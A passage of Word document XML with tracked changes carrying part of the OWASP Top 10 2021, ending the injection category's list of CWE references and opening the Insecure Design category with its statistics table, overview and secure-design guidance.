            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/564.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="70D4C5A5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1542" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1543" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-610: Externally Controlled Reference to a Resource in Another </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Sphere](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/610.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2DAF508A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1544" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1545" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath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https://cwe.mitre.org/data/definitions/643.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="39B192E1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1546" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1547" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-644: Improper Neutralization of HTTP Headers for Scripting </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Syntax](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/644.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6C5C85EC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1548" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1549" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-652: Improper Neutralization of Data within XQuery Expressions ('XQuery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https://cwe.mitre.org/data/definitions/652.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="348A93D0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1550" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1551" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection'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https://cwe.mitre.org/data/definitions/917.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="43556DC0" w14:textId="77777777" w:rsidR="00E300D6" w:rsidRDefault="00E300D6" w:rsidP="00AC649A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F603AC3"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69BB26C6"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"https://owasp.org/Top10/A04_2021-Insecure_Design/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BCB7543" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>title:   "A04:2021 – Insecure Design"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="575E646E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>id:      "A04:2021"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B3FA8AD"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3436D116"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36000379" w14:textId="2B9212ED" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">A04:2021 – Insecure Design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[icon](assets/TOP_10_Icons_Final_Insecure_Design.png){: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name="Insecure Design", lang=lang, source=source, parent=parent) }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39920190" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3152CB87" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1552" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1553" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Factors</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5056C831" w14:textId="77777777" w:rsidR="00B74248" w:rsidRPr="00841D1E" w:rsidRDefault="00B74248" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1554" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C4AEAF3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1555" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1556"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51243C60" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1557" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1558" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>|:-------------:|:--------------------:|:--------------------:|:--------------:|:--------------:|:----------------------:|:---------------------:|:-------------------:|:------------:|</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="762D0F61" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1559" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1560" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>| 40          | 24.19%             | 3.00%              | 6.46                 | 6.78                | 77.25%       | 42.51%       | 262,407           | 2,691      |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="39B3FAA5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1561" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48A34FE7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1562" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1563" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Overview</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3C3D2118" w14:textId="77777777" w:rsidR="00B74248" w:rsidRPr="00841D1E" w:rsidRDefault="00B74248" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1564" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="102B56D6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1565" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1566" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">A new category for 2021 focuses on risks related to design and architectural flaws, with a call for more use of threat modeling, secure design patterns, and reference architectures. As a community we need to move </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>beyond  "</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>shift-left" in the coding space to pre-code activities that are critical for the principles of Secure by Design. Notable Common Weakness Enumerations (CWEs) include *CWE-209: Generation of Error Message Containing Sensitive Information*, *CWE-256: Unprotected Storage of Credentials*, *CWE-501: Trust Boundary Violation*, and *CWE-522: Insufficiently Protected Credentials*.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="69AEFD4C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1567" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7938373B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1568" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1569" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Description</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7CABBE7A" w14:textId="77777777" w:rsidR="00B74248" w:rsidRPr="00841D1E" w:rsidRDefault="00B74248" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1570" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63B74BD3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1571" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1572" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>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ins>
    </w:p>
    <w:p w14:paraId="09E4C116" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1573" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27D01DE5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1574" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1575" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>### Requirements and Resource Management</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="761796CE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1576" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02015B05" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1577" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1578" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Collect and negotiate the business requirements for an application with the business, including the protection requirements concerning confidentiality, integrity, availability, and authenticity of all data assets and the expected business logic. Take into account how exposed your application will be and if you need segregation of tenants (additionally to access control). Compile the technical requirements, including functional and non-functional security requirements. Plan and negotiate the budget covering all design, build, testing, and operation, including security activities.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="090D7DCD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1579" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="659FD0AE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1580" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1581" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>### Secure Design</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3F157E51" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1582" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="369BAF2F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1583" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1584" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Secure design is a culture and methodology that constantly evaluates threats and ensures that code is robustly designed and tested to prevent known attack methods. Threat modeling should be integrated into </w:t>
        </w:r>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>refinement sessions (or similar activities); look for changes in data flows and access control or other security controls. In the user story development determine the correct flow and failure states, ensure they are well understood and agreed upon by responsible and impacted parties. Analyze assumptions and conditions for expected and failure flows, ensure they are still accurate and desirable. Determine how to validate the assumptions and enforce conditions needed for proper behaviors. Ensure the results are documented in the user story. Learn from mistakes and offer positive incentives to promote improvements. Secure design is neither an add-on nor a tool that you can add to software.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0D9C7C0A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1585" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="474F3691" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1586" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1587" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>### Secure Development Lifecycle</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="44ED3596" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1588" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B2D9E52" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1589" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1590" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Secure software requires a secure development lifecycle, some form of secure design pattern, paved road methodology, secured component library, tooling, and threat modeling. Reach out for your security specialists at the beginning of a software project throughout the whole project and maintenance of your software. Consider leveraging the [OWASP Software Assurance Maturity Model (SAMM</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>)](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://owaspsamm.org) to help structure your secure software development efforts.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="001FA009" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="1591" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
